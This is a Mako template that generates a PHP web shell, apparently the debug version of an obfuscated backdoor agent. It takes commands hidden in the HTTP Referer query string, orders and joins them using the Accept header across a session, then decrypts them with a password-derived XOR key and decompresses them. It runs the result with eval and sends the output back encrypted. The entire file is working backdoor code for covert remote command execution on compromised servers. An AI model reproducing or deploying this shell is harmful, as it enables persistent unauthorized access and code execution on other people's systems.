<%! import hashlib %><%
key = hashlib.md5(password).hexdigest().lower()
header = key[:4]
footer = key[4:8]
%>$kh="${header}"; 
$kf="${footer}";
$k="${key[:8]}";
<%text>

error_reporting(E_ALL);
function x($t,$k) {
	$c=strlen($k);
	$l=strlen($t);
	$o="";
	for($i=0;$i<$l;) {
	     for($j=0;($j<$c&&$i<$l);$j++,$i++)
	     {
	         $o.= $t{$i}^$k{$j};
	     }
	 }  
	 return $o;
}

$r=$_SERVER;

$q=null;
if (isset($r["HTTP_REFERER"])){
  $u=parse_url($r["HTTP_REFERER"]);
  if(isset($u["query"])) parse_str($u["query"],$q);
  $q=array_values($q);
}

$m=null;
if (isset($r['HTTP_ACCEPT'])){
  $a=$r['HTTP_ACCEPT'];
  if(isset($a)) preg_match_all('/([\w])[\w-]+(?:;q=0.([\d]))?,?/',$a,$m);
}

print("<$kh${kf}DEBUG>REQ OK?</$kh${kf}DEBUG>");
if ($q && $m) {
	print("<$kh${kf}DEBUG>REQ OK!</$kh${kf}DEBUG>");

   @session_start();

   $s=&$_SESSION;

   $i = $m[1][0].$m[1][1];
   $h = strtolower(substr(md5($i.$kh),0,3));
   $f = strtolower(substr(md5($i.$kf),0,3));

	// TODO: use a regexp to shortify
   print("<$kh${kf}DEBUG>ORDER: "); var_dump($q); var_dump($m[2]); print("</$kh${kf}DEBUG>");

   $p='';
   for($z=1;$z<count($m[1]);$z++) $p=$p.$q[$m[2][$z]];

   print("<$kh${kf}DEBUG>HEADER $h in $p = ".strpos($p,$h)."?</$kh${kf}DEBUG>");

   // The header corresponds, initialize a SESSION START
   if(strpos($p,$h)===0){
		print("<$kh${kf}DEBUG>HEADER OK!</$kh${kf}DEBUG>");
		$s[$i] = '';
		$p=substr($p,3);
   }

   print("<$kh${kf}DEBUG>ID IN SESSION? ". var_dump($s) ."</$kh${kf}DEBUG>");
   // If there is the session, could be SESSION MIDDLE or SESSION END
   if(array_key_exists($i,$s)) {

		print("<$kh${kf}DEBUG>ID OK!</$kh${kf}DEBUG>");
		
		$s[$i]=$s[$i].$p;
		
		// Check if is SESSION END
		$e=strpos($s[$i],$f);
		print("<$kh${kf}DEBUG>FOOTER $f in $s[$i]? $e</$kh${kf}DEBUG>");
		
		if($e){
			$b64 = preg_replace(array("/_/","/-/"),array("/","+"),substr($s[$i],0,$e));
			
			print("<$kh${kf}DEBUG>OK FOOTER!</$kh${kf}DEBUG>");
			//var_dump(gzuncompress(x(base64_decode($b64),$k)));
			//eval(gzuncompress(x(base64_decode($b64),$k)));
			//print("");
			
			ob_start();
			eval(gzuncompress(x(base64_decode($b64),$k)));
			$o=ob_get_contents();
			ob_end_clean();
			$d=base64_encode(x(gzcompress($o),$k));
			print("<$kh${kf}>$d</$kh${kf}>");
			@session_destroy();
			
		}
   }
}

</%text>
